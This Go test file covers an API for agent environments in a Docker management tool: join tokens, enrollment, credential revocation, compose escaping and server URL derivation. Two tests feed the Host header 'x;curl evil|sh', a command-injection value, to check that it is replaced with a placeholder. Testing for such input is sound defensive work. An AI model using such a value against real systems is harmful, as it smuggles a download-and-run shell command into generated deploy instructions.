package api

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"os"
	"strings"
	"testing"

	"git.zefirlabs.net/zefir/nudge/backend/internal/docker/dockertest"
)

func createAgentEnv(t *testing.T, et envTest, name string) createdEnvironmentResponse {
	t.Helper()
	rec := do(t, et.h, request{method: "POST", path: "/api/v1/environments", body: fmt.Sprintf(`{"name":%q,"kind":"agent"}`, name), cookie: et.cookie})
	if rec.Code != http.StatusCreated {
		t.Fatalf("create: code = %d (%s)", rec.Code, rec.Body)
	}
	if cc := rec.Header().Get("Cache-Control"); cc != "no-store" {
		t.Errorf("Cache-Control = %q, want no-store on a response with a join token", cc)
	}
	var got createdEnvironmentResponse
	if err := json.Unmarshal(rec.Body.Bytes(), &got); err != nil {
		t.Fatal(err)
	}
	return got
}

func enroll(t *testing.T, et envTest, token string) *httptest.ResponseRecorder {
	t.Helper()
	return do(t, et.h, request{method: "POST", path: "/api/v1/agents/enroll", body: fmt.Sprintf(`{"join_token":%q}`, token)})
}

func agentOf(t *testing.T, et envTest, id int64) *agentResponse {
	t.Helper()
	rec := do(t, et.h, request{method: "GET", path: "/api/v1/environments", cookie: et.cookie})
	var envs []environmentResponse
	if err := json.Unmarshal(rec.Body.Bytes(), &envs); err != nil {
		t.Fatal(err)
	}
	for _, e := range envs {
		if e.ID == id {
			return e.Agent
		}
	}
	t.Fatalf("environment %d not listed: %s", id, rec.Body)
	return nil
}

func TestCreateAgentEnvironment(t *testing.T) {
	t.Parallel()
	et := newEnvTest(t, map[string]*dockertest.Fake{"local": {}})
	got := createAgentEnv(t, et, "nas")
	if got.Name != "nas" || got.Kind != "agent" || got.Online || got.Agent == nil || got.Agent.Enrolled {
		t.Errorf("environment = %+v", got.environmentResponse)
	}
	jt := got.JoinToken
	if !strings.HasPrefix(jt.Token, "nudge_join_") || jt.ExpiresAt.IsZero() {
		t.Errorf("join token = %+v", jt)
	}
	for _, want := range []string{"-e NUDGE_SERVER_URL=http://example.com ", "-e NUDGE_JOIN_TOKEN=" + jt.Token + " ", "nudge:latest agent"} {
		if !strings.Contains(jt.DockerRun, want) {
			t.Errorf("docker run %q lacks %q", jt.DockerRun, want)
		}
	}
	for _, want := range []string{"\n      NUDGE_SERVER_URL: \"http://example.com\"\n", "\n      NUDGE_JOIN_TOKEN: \"" + jt.Token + "\"\n", "image: " + agentImage + "\n    command: agent\n"} {
		if !strings.Contains(jt.Compose, want) {
			t.Errorf("compose %q lacks %q", jt.Compose, want)
		}
	}
	if a := agentOf(t, et, got.ID); a == nil || a.Enrolled {
		t.Errorf("listed agent = %+v, want not enrolled", a)
	}
	if a := agentOf(t, et, et.ids["local"]); a != nil {
		t.Errorf("local environment has agent fields: %+v", a)
	}

	tests := []struct {
		name     string
		body     string
		noCookie bool
		wantCode int
	}{
		{name: "local kind", body: `{"name":"x","kind":"local"}`, wantCode: 400},
		{name: "no kind", body: `{"name":"x"}`, wantCode: 400},
		{name: "bad name", body: `{"name":" x","kind":"agent"}`, wantCode: 400},
		{name: "taken name", body: `{"name":"nas","kind":"agent"}`, wantCode: 409},
		{name: "malformed", body: `{`, wantCode: 400},
		{name: "no session", body: `{"name":"y","kind":"agent"}`, noCookie: true, wantCode: 401},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			req := request{method: "POST", path: "/api/v1/environments", body: tt.body, cookie: et.cookie}
			if tt.noCookie {
				req.cookie = nil
			}
			if rec := do(t, et.h, req); rec.Code != tt.wantCode {
				t.Errorf("code = %d, want %d (%s)", rec.Code, tt.wantCode, rec.Body)
			}
		})
	}
}

func TestDockerRunHost(t *testing.T) {
	t.Parallel()
	et := newEnvTest(t, map[string]*dockertest.Fake{"local": {}})
	tests := []struct {
		host        string
		want        string
		wantCompose string
	}{
		{host: "nudge.example.net:8443", want: "NUDGE_SERVER_URL=http://nudge.example.net:8443 ", wantCompose: `NUDGE_SERVER_URL: "http://nudge.example.net:8443"` + "\n"},
		{host: "[::1]:8080", want: "NUDGE_SERVER_URL=http://[::1]:8080 ", wantCompose: `NUDGE_SERVER_URL: "http://[::1]:8080"` + "\n"},
		{host: "x;curl evil|sh", want: "NUDGE_SERVER_URL=https://<server> ", wantCompose: `NUDGE_SERVER_URL: "https://<server>"` + "\n"},
	}
	for _, tt := range tests {
		r := httptest.NewRequest(http.MethodPost, "/api/v1/environments", strings.NewReader(fmt.Sprintf(`{"name":%q,"kind":"agent"}`, "env-"+tt.host)))
		r.Host = tt.host
		r.AddCookie(et.cookie)
		rec := httptest.NewRecorder()
		et.h.ServeHTTP(rec, r)
		var got createdEnvironmentResponse
		if err := json.Unmarshal(rec.Body.Bytes(), &got); err != nil || rec.Code != http.StatusCreated {
			t.Fatalf("%s: code = %d (%s)", tt.host, rec.Code, rec.Body)
		}
		if !strings.Contains(got.JoinToken.DockerRun, tt.want) {
			t.Errorf("%s: docker run %q, want %q", tt.host, got.JoinToken.DockerRun, tt.want)
		}
		if !strings.Contains(got.JoinToken.Compose, tt.wantCompose) {
			t.Errorf("%s: compose %q, want %q", tt.host, got.JoinToken.Compose, tt.wantCompose)
		}
	}
}

func TestComposeValue(t *testing.T) {
	t.Parallel()
	tests := []struct {
		in, want string
	}{
		{in: "https://nudge.example.net", want: `"https://nudge.example.net"`},
		{in: "nudge_join_abc", want: `"nudge_join_abc"`},
		{in: "a$b${X}", want: `"a$$b$${X}"`},
		{in: "a\"b\\c\nd: e # f", want: `"a\"b\\c\nd: e # f"`},
		{in: "", want: `""`},
	}
	for _, tt := range tests {
		if got := composeValue(tt.in); got != tt.want {
			t.Errorf("composeValue(%q) = %s, want %s", tt.in, got, tt.want)
		}
	}
}

// TestAgentComposeFile keeps deploy/agent.compose.yml and the generated compose file
// the same, comments aside.
func TestAgentComposeFile(t *testing.T) {
	t.Parallel()
	b, err := os.ReadFile("../../../deploy/agent.compose.yml")
	if err != nil {
		t.Fatal(err)
	}
	var lines []string
	for line := range strings.Lines(string(b)) {
		if !strings.HasPrefix(strings.TrimSpace(line), "#") {
			lines = append(lines, line)
		}
	}
	if got, want := strings.Join(lines, ""), agentCompose("https://nudge.example.net", "<from the UI>"); got != want {
		t.Errorf("deploy/agent.compose.yml without comments =\n%s\nwant\n%s", got, want)
	}
}

func TestEnrollAgent(t *testing.T) {
	t.Parallel()
	et := newEnvTest(t, map[string]*dockertest.Fake{"local": {}})
	created := createAgentEnv(t, et, "nas")

	rec := enroll(t, et, created.JoinToken.Token)
	if rec.Code != http.StatusCreated {
		t.Fatalf("enroll: code = %d (%s)", rec.Code, rec.Body)
	}
	if cc := rec.Header().Get("Cache-Control"); cc != "no-store" {
		t.Errorf("Cache-Control = %q, want no-store on a response with a secret", cc)
	}
	var creds enrollResponse
	if err := json.Unmarshal(rec.Body.Bytes(), &creds); err != nil {
		t.Fatal(err)
	}
	if creds.EnvironmentID != created.ID || !strings.HasPrefix(creds.AgentID, "agt_") || !strings.HasPrefix(creds.AgentSecret, "nudge_agent_") {
		t.Errorf("creds = %+v", creds)
	}
	if a := agentOf(t, et, created.ID); a == nil || !a.Enrolled {
		t.Errorf("listed agent = %+v, want enrolled", a)
	}

	tests := []struct {
		name     string
		body     string
		wantCode int
	}{
		{name: "used token", body: fmt.Sprintf(`{"join_token":%q}`, created.JoinToken.Token), wantCode: 401},
		{name: "unknown token", body: `{"join_token":"nudge_join_00"}`, wantCode: 401},
		{name: "no token", body: `{}`, wantCode: 401},
		{name: "malformed", body: `nope`, wantCode: 400},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			rec := do(t, et.h, request{method: "POST", path: "/api/v1/agents/enroll", body: tt.body})
			if rec.Code != tt.wantCode {
				t.Errorf("code = %d, want %d (%s)", rec.Code, tt.wantCode, rec.Body)
			}
		})
	}
}

func TestJoinTokenAndRevoke(t *testing.T) {
	t.Parallel()
	et := newEnvTest(t, map[string]*dockertest.Fake{"local": {}})
	created := createAgentEnv(t, et, "nas")
	path := func(id int64, rest string) string { return fmt.Sprintf("/api/v1/environments/%d%s", id, rest) }

	rec := do(t, et.h, request{method: "POST", path: path(created.ID, "/join-tokens"), cookie: et.cookie})
	if rec.Code != http.StatusCreated {
		t.Fatalf("new join token: code = %d (%s)", rec.Code, rec.Body)
	}
	var jt joinTokenResponse
	if err := json.Unmarshal(rec.Body.Bytes(), &jt); err != nil {
		t.Fatal(err)
	}
	if jt.Token == created.JoinToken.Token || !strings.Contains(jt.DockerRun, jt.Token) || !strings.Contains(jt.Compose, jt.Token) {
		t.Errorf("join token = %+v, want a new one", jt)
	}
	if rec := enroll(t, et, created.JoinToken.Token); rec.Code != http.StatusUnauthorized {
		t.Errorf("replaced token: code = %d, want 401", rec.Code)
	}
	if rec := enroll(t, et, jt.Token); rec.Code != http.StatusCreated {
		t.Fatalf("enroll: code = %d (%s)", rec.Code, rec.Body)
	}

	if rec := do(t, et.h, request{method: "DELETE", path: path(created.ID, "/credentials"), cookie: et.cookie}); rec.Code != http.StatusNoContent {
		t.Fatalf("revoke: code = %d (%s)", rec.Code, rec.Body)
	}
	if a := agentOf(t, et, created.ID); a == nil || a.Enrolled {
		t.Errorf("after revoke: agent = %+v, want not enrolled", a)
	}

	tests := []struct {
		name     string
		method   string
		path     string
		noCookie bool
		wantCode int
	}{
		{name: "token for local", method: "POST", path: path(et.ids["local"], "/join-tokens"), wantCode: 409},
		{name: "revoke local", method: "DELETE", path: path(et.ids["local"], "/credentials"), wantCode: 409},
		{name: "token for unknown", method: "POST", path: path(999, "/join-tokens"), wantCode: 404},
		{name: "revoke unknown", method: "DELETE", path: "/api/v1/environments/x/credentials", wantCode: 404},
		{name: "token without session", method: "POST", path: path(created.ID, "/join-tokens"), noCookie: true, wantCode: 401},
		{name: "revoke without session", method: "DELETE", path: path(created.ID, "/credentials"), noCookie: true, wantCode: 401},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			req := request{method: tt.method, path: tt.path, cookie: et.cookie}
			if tt.noCookie {
				req.cookie = nil
			}
			if rec := do(t, et.h, req); rec.Code != tt.wantCode {
				t.Errorf("code = %d, want %d (%s)", rec.Code, tt.wantCode, rec.Body)
			}
		})
	}
}

func TestServerURL(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name      string
		publicURL string
		tls       bool
		trusted   bool
		proto     string
		host      string
		want      string
	}{
		{name: "public url wins", publicURL: "https://nudge.example.net", host: "10.0.0.5:8080", want: "https://nudge.example.net"},
		{name: "plain http", host: "10.0.0.5:8080", want: "http://10.0.0.5:8080"},
		{name: "own TLS", tls: true, host: "nudge.example.net", want: "https://nudge.example.net"},
		{name: "TLS-terminating proxy", trusted: true, proto: "https", host: "nudge.example.net", want: "https://nudge.example.net"},
		{name: "X-Forwarded-Proto from an untrusted peer", proto: "https", host: "nudge.example.net", want: "http://nudge.example.net"},
		{name: "unsafe host", host: "x;curl evil|sh", want: "https://<server>"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			s := &server{publicURL: tt.publicURL}
			r := httptest.NewRequest(http.MethodPost, "/api/v1/environments", nil)
			r.Host = tt.host
			if tt.tls {
				r.TLS = &tls.ConnectionState{}
			}
			if tt.proto != "" {
				r.Header.Set("X-Forwarded-Proto", tt.proto)
			}
			var p proxies
			if tt.trusted {
				p = proxies{netip.MustParsePrefix("192.0.2.0/24")}
			}
			if got := s.serverURL(p.resolve(r)); got != tt.want {
				t.Errorf("serverURL = %q, want %q", got, tt.want)
			}
		})
	}
}
